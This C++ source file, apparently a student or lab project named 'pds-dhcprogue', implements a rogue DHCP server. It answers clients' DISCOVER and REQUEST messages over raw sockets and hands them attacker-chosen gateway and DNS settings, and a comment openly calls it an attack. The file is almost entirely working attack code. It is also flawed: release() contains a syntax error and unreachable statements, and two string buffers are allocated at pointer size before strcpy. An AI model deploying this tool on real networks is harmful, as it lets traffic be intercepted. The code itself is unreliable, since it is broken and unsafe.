#include "pds-dhcprogue.h"

void help(){
  printf("HELP\n");
}

/**
* Eror message wrapper
*/
void err(string msg, int erno, short show_help){
  fprintf(stderr, "%s\n", msg.c_str());
  if (show_help) help();
  exit(erno);
}

/**
* Universal function for memory allocation checking
*/
void check_null(void * lel){
  if (lel == NULL) err("Memory allocation failure", ERR, 0);
}

/**
* Check if string really contains ip address and convert to uint32_t
*/
uint32_t str_to_ip(const char* addr){
  struct in_addr tmp;
  if ((inet_pton(AF_INET, addr, &tmp)) != 1) {
    err("inet_pton failed", ERR, 0);
  }
  return tmp.s_addr;
}

/**
* Check ip address and convert to c_string
*/
char* ip_to_str(uint32_t addr){
  char* buffer = (char *)malloc(INET_ADDRSTRLEN);
  check_null(buffer);
  // init struct required by init_ntop
  struct in_addr tmp;
  tmp.s_addr = addr;
  // check address and convert to string
  if (inet_ntop(AF_INET, &tmp, buffer, INET6_ADDRSTRLEN) == NULL) {
    free(buffer);
    err("inet_ntop faild", ERR, 0);
  }
  return buffer;
}


void fill_range(struct ip_pool* p) {
  for (uint32_t i = p->ip_first; i <= p->ip_last; i=htonl(htonl(i)+1)) {
    p->ip_pool.push_back(i);
  }
  if (p->ip_pool.empty()) {
    err("Empty pool of free ip adresses", ERR, 0);
  }
  p->ip_next = p->ip_first;   // assign first usable ip address
}

void parse_pool(char* arg) {
  int delim = 0;
  for (size_t i = 0; i < strlen(arg); i++) {
    if (arg[i] == '-') {  // find delimiter so we know where to split
      delim = i;
      break;
    }
  }
  if (!delim) { // make sure that delimiter was parsed
    err("Could not parse pool", ERR, 1);
  }
  char* start = (char*)malloc(delim+1);
  check_null(start);
  char* end = (char*)malloc(strlen(arg)-delim-1);
  check_null(end);
  // divide andresses and copy them to own arrays
  strncpy(start, arg, delim);
  start[delim] = '\0';
  strncpy(end, arg+delim+1, strlen(arg)-delim);
  // convert the arrays to ip addresses and assign them to pool
  p->ip_first = str_to_ip(start);
  p->ip_last = str_to_ip(end);
  // memory is precious
  free(start);
  free(end);
  // fill the pool with ip addreses
  fill_range(p);
}


int get_num(char *arg) {
   	char *white = NULL;
   	int n = (int) strtod(arg, &white);
   	if(strlen(white) != 0) {
      fprintf(stderr,"failed to parse lease time, unexpected input \"%s\"\n",white);
     	err("", ERR, 1);
   	}
   	return n;
}

void check_args(int argc, char **argv){
  p = (struct ip_pool*) malloc(sizeof(struct ip_pool));
  check_null(p);

  if (argc != 13) {
    err("Arguments not recognized", ERR, 1);
  }
  char c;
  while ((c = getopt (argc, argv, "i:p:g:n:d:l:")) != -1){
    switch (c) {
      case 'i':
        p->interface = (char*) malloc(sizeof(optarg));
        check_null(p->interface);
        strcpy(p->interface, optarg);
        break;
      case 'p':
        parse_pool(optarg);
        break;
      case 'g':
        p->ip_gateway = str_to_ip(optarg);
        break;
      case 'n':
        p->ip_dns = str_to_ip(optarg);
        break;
      case 'd':
        p->domain = (char*) malloc(sizeof(optarg));
        check_null(p->domain);
        strcpy(p->domain, optarg);
        break;
      case 'l':
        p->lease_time = get_num(optarg);
        break;
      default:
        break;
    }
  }
}
/**
* Compute the checksum, inspired by rfc1071 and
* https://www.thegeekstuff.com/2012/05/ip-header-checksum
*/
void checksum(struct ip *hdr, int len){
  int sum = 0;
  hdr->ip_sum = sum;
  uint16_t* word = (uint16_t*)hdr;

  while (len > 1){
    sum += *word++;
    len -= 2;
  }
  if (len == 1){  // add leftover byte
    uint8_t answer = *(u_char *)word;
    sum += answer;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  hdr->ip_sum = ~sum;
}

/**
* Allocate and fill udp header
*/
struct udphdr* get_udp_header(){
  struct udphdr* udp_header = (struct udphdr*)malloc(sizeof(struct udphdr));
  check_null(udp_header);

  udp_header->source = htons(DHCP_SRC_PORT); // Fill ports
  udp_header->dest = htons(DHCP_DST_PORT);
  udp_header->check = 0 ; // checksum is not compulsory for udp in ip_v4
  udp_header->len = htons(DHCP_BUFFER_SIZE + UDP_HEADER_LEN);
  return udp_header;
}

/**
* Create, allocate and fill necessary values to ip header
*/
struct ip* get_ip_header(uint32_t ip_dest){
  struct ip* hdr = (struct ip*)malloc(sizeof(struct ip));
  check_null(hdr);

  hdr->ip_hl = 5;               // 5 bytes
  hdr->ip_v = 4;                // version 4
  hdr->ip_tos = 0;              // best effort
  hdr->ip_off = 0;              // no fragmentation
  hdr->ip_id = htons(random()); // random blob
  hdr->ip_ttl = 255;            // 255, why not it's an attack
  hdr->ip_p = IPPROTO_UDP;      // udp, RFC constant
  hdr->ip_len = htons(DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN);
  // fill interface ip address as source address
  inet_pton(AF_INET, ip_to_str(p->int_ip_address), &hdr->ip_src);
  inet_pton(AF_INET, ip_to_str(ip_dest), &hdr->ip_dst);
  checksum(hdr,IP4_HEADER_LEN);
  return hdr;
}

uint32_t lease_ip(uint8_t* dst_mac_addr, int discover){
  if (p->ip_next == 0) {
    fprintf(stderr, "%s\n","Empty pool, cannot perform lease");
    return 0;
  }
  struct pool_item item;   // write to lease list
  memcpy(item.mac_addr, dst_mac_addr, MAC_ADDR_LEN);
  item.ip_addr = p->ip_next;

  if (discover)
    item.lease_expr = time(0) + 5; // discover flood prevention
  else
    item.lease_expr = time(0) + p->lease_time; // normal lease after request
  // Item complete, store it
  p->leased_list.insert(p->leased_list.begin(), item);
  // Remove taken address
  p->ip_pool.erase(find(p->ip_pool.begin(), p->ip_pool.end(), p->ip_next));
  // Prepare next
  if (p->ip_pool.empty())
    p->ip_next = 0;                   // pool is out of addresses
  else
    p->ip_next = p->ip_pool.front();  // assign next available
  printf("Leasing: %s\n", ip_to_str(item.ip_addr));
  return item.ip_addr;
}

uint32_t get_client_ip(uint8_t *dst_mac_addr, int extend){
  if (p->leased_list.empty()) {
    return lease_ip(dst_mac_addr, 0);
  }
  vector<struct pool_item>::iterator it;
  for (it = p->leased_list.begin(); it != p->leased_list.end(); ++it){
    if (memcmp(it->mac_addr, dst_mac_addr, MAC_ADDR_LEN*sizeof(uint8_t)) == 0){
      if (extend)
        it->lease_expr = time(0) + p->lease_time;
      return it->ip_addr;
    }
  }
  return lease_ip(dst_mac_addr, 0); // not found
}

void expiration_check(){
  if (p->leased_list.empty()){
    return;
  }
  vector<struct pool_item>::iterator it;
  for (it = p->leased_list.begin(); it != p->leased_list.end(); ++it){
    if ((difftime(time(0), it->lease_expr)) > 0) {
      p->ip_pool.push_back(it->ip_addr);
      it = p->leased_list.erase(it);
    }
  }
}

void release(unsigned char * buffer){
  if (p->leased_list.empty()){
    return;
  }
  uint8_t mac[MAC_ADDR_LEN];
  memcpy(&mac, &buffer[28], MAC_ADDR_LEN * uint8_t)
  printf("> Releasing MAC Address : %02x:%02x:%02x:%02x:%02x:%02x\n",
  (unsigned char) mac[0],
  (unsigned char) mac[1],
  (unsigned char) mac[2],
  (unsigned char) mac[3],
  (unsigned char) mac[4],
  (unsigned char) mac[5]);
  vector<struct pool_item>::iterator it;
  for (it = p->leased_list.begin(); it != p->leased_list.end(); ++it){
    if (memcmp(it->mac_addr, mac, MAC_ADDR_LEN*sizeof(uint8_t)) == 0){
      printf("MAC found in leases, .... erasing lease\n");
      return;
      p->ip_pool.push_back(it->ip_addr);
      p->leased_list.erase(it);
      break;
    }
  }
}

void make_dhcp_reply(unsigned char* msg, uint32_t client_ip, const int msg_type){
  // change only required parts of received DHCP message
  msg[0] = (int) 2;                // DHCP REPLY
  memcpy(&msg[16], &client_ip, IP_ADDR_LEN);
  memcpy(&msg[20], &p->ip_gateway, IP_ADDR_LEN);
  msg[240] = (int) 53;             // OPTION defining dhcp message type
  msg[241] = (int) 1;              // length of ^
  msg[242] = (int) msg_type;       // OFFER or ACK
  msg[243] = (int) 51;             // lease time
  msg[244] = (int) 4;
  uint32_t t = htonl(p->lease_time);
  memcpy(&msg[245], &t, sizeof(uint32_t));
  msg[249] = (int) 54;              // next server ip
  msg[250] = (int) 4;
  memcpy(&msg[251], &p->ip_gateway, IP_ADDR_LEN);
  msg[255] = (int) 6;               // DNS server ip
  msg[256] = (int) 4;
  memcpy(&msg[257], &p->ip_gateway, IP_ADDR_LEN);
  msg[261] = (int) 15;              // DNS server ip
  msg[262] = (int) strlen(p->domain);
  strcpy((char*)&msg[263], p->domain);
  msg[263 + strlen(p->domain)] = (int) 255; //end
}


void send(unsigned char *msg, const int msg_type){
  uint8_t dst_mac_addr[MAC_ADDR_LEN];
  memcpy(dst_mac_addr, &msg[28], MAC_ADDR_LEN);

  struct sockaddr_ll interface;
  // setup interface, see "man packet"
  bzero(&interface, sizeof(struct sockaddr_ll));
  // get interface index
  if((interface.sll_ifindex = if_nametoindex(p->interface)) == 0){
    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
  }
  interface.sll_family = AF_PACKET;   // setup interface, see "man packet"
  interface.sll_halen = ETH_ALEN;
  interface.sll_protocol = htons(ETH_P_802_3);
  memcpy(interface.sll_addr, p->int_mac_address, MAC_ADDR_LEN * sizeof(uint8_t));

  int eth_msg_len = DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN + ETH_HEADER_LEN;
  unsigned char* eth_frame = (unsigned char*)malloc(eth_msg_len);
  check_null(eth_frame);

  memcpy(eth_frame, dst_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
  memcpy(eth_frame + MAC_ADDR_LEN, p->int_mac_address, MAC_ADDR_LEN * sizeof(uint8_t));
  eth_frame[12] = 0x08; // ETH_P_IP value
  eth_frame[13] = 0x00;
  // L2 ends here ^ Add IP (L3) and UDP (L4) headers next...
  uint32_t client_ip_addr = 0;
  if(msg_type == DHCP_OFFER)
    client_ip_addr = lease_ip(dst_mac_addr, 1); // make an actual lease
  else
    client_ip_addr = get_client_ip(dst_mac_addr, 0);

  struct ip* ip_header = get_ip_header(client_ip_addr);
  struct udphdr* udp_header = get_udp_header();

  memcpy(eth_frame + ETH_HEADER_LEN, ip_header, IP4_HEADER_LEN * sizeof(uint8_t));
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));

  make_dhcp_reply(msg, client_ip_addr, msg_type);
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, msg, DHCP_BUFFER_SIZE * sizeof(uint8_t));
  // fire
  int sent = 0;
  if ((sent = sendto(send_socket, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0){
    err("sendto() failed", sent, 0);
  }
  free(eth_frame);
}

void dhcp() {
  unsigned char msg[DHCP_BUFFER_SIZE];
  bzero(&msg, DHCP_BUFFER_SIZE);
  struct sockaddr_ll interface;
  // setup interface, see "man packet"
  bzero(&interface, sizeof(struct sockaddr_ll));
  // get interface index
  if((interface.sll_ifindex = if_nametoindex(p->interface)) == 0){
    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
  }
  interface.sll_family = AF_PACKET;   // setup interface, see "man packet"
  interface.sll_halen = ETH_ALEN;
  interface.sll_protocol = htons(ETH_P_802_3);
  socklen_t length = sizeof(interface);
  int rcvd = 0; // receive data and decive what to do
  while((rcvd = recvfrom(listen_socket, msg, DHCP_BUFFER_SIZE, 0, (struct sockaddr *)&interface, &length)) >= 0)
  {
    expiration_check();
    switch (msg[242]) {
      case (int) DHCP_DISCOVER:
        send(msg, DHCP_OFFER);
        break;
      case (int) DHCP_REQUEST:
        send(msg, DHCP_ACK);
        release(msg);
        break;
      case (int) DHCP_RELEASE:
        release(msg);
        break;
      default: break;
    }
    bzero(msg,DHCP_BUFFER_SIZE);
  }
}
/**
* Get mac, ip, netmask configured on interface, ref. man ioctl
*/
void get_interface_info(){
  // determine device mac adress required fo L2 header
  struct ifreq ifr;
  bzero(&ifr, sizeof(struct ifreq));
  printf("%s\n",p->interface );
  memcpy(ifr.ifr_name, p->interface, strlen(p->interface));
  // get MAC address
  if(ioctl(send_socket, SIOCGIFHWADDR, &ifr) < 0){
    err("ioctl failed, cannot determine interface's MAC address", ERR, 0);
  }
  memcpy(p->int_mac_address, ifr.ifr_hwaddr.sa_data, 6 * sizeof(uint8_t));
  // same for device ip address for L3 header - ip address
  if(ioctl(send_socket, SIOCGIFADDR, &ifr) < 0){
    err("ioctl failed, cannot determine interface's IP address", ERR, 0);
  }
  p->int_ip_address = str_to_ip(inet_ntoa((((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr)));
  // get network mask
  if (ioctl(send_socket, SIOCGIFNETMASK, &ifr) < 0){
    err("ioctl failed, cannot determine interface's network mask", ERR, 0);
  }
  p->int_ip_netmask = str_to_ip(inet_ntoa((((struct sockaddr_in *)&(ifr.ifr_netmask))->sin_addr)));
}

void server_start() {
  // creating one additional socket that server will listen on to detect and
  // parse DHCP DISCOVER which have all required information
  if((listen_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
    err ("Failed to create SOCK_DGRAM", listen_socket, 0);
  }
  struct sockaddr_in srv;
  bzero(&srv, sizeof(struct sockaddr_in));
  srv.sin_family = AF_INET;
  srv.sin_addr.s_addr = INADDR_ANY;     // dont care
  srv.sin_port = htons(DHCP_SRC_PORT);  // 67

  if((bind(listen_socket, (struct sockaddr *)&srv, sizeof(srv))) != 0){
    err ("Failed to bind listen socket", listen_socket, 0);
  }
  // // setup second raw socket for sending, so we can use L2 unicast
  if ((send_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
    err ("Failed to create SOCK_RAW", send_socket, 0);
  }
  // get MAC address, ip_address and netmask
  get_interface_info();
  // all set, continue
  dhcp();
}

void cleanup(int sig) {
  if (p->interface != NULL)     free(p->interface);
  if (p->domain != NULL)        free(p->domain);
  if (p != NULL)                free(p);
  if (send_socket)              close(send_socket);
  if (listen_socket)            close(listen_socket);
  signal(sig, SIG_IGN);
  exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
  signal(SIGINT, cleanup);
  check_args(argc, argv);
  srand(time(NULL));
  server_start();
  return 0;
}
